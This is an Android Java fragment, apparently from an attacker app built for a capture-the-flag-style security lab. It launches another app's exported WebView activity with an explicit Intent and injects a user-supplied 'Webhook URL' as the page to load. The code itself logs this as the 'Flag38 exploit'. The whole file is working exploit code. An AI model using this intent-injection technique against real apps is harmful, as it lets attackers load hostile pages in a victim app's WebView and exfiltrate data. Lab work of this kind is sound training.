package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag38Fragment extends Fragment {
    private static final String TAG = "Flag38Fragment";

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag38, container, false);
        
        EditText editText = view.findViewById(R.id.editTextFlag38);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag38);
        
        launchButton.setOnClickListener(v -> {
            try {
                String URL = editText.getText().toString();
                if (URL.isEmpty()) {
                    Toast.makeText(getContext(), "Please enter Webhook URL", Toast.LENGTH_SHORT).show();
                    return;
                }

                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", 
                        "io.hextree.attacksurface.webviews.Flag38WebViewsActivity"));
                intent.putExtra("URL", URL);
                startActivity(intent);
            } catch (Exception e) {
                Log.e(TAG, "Error launching Flag38 exploit: " + e.getMessage());
                Toast.makeText(getContext(), "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
            }
        });

        return view;
    }
} 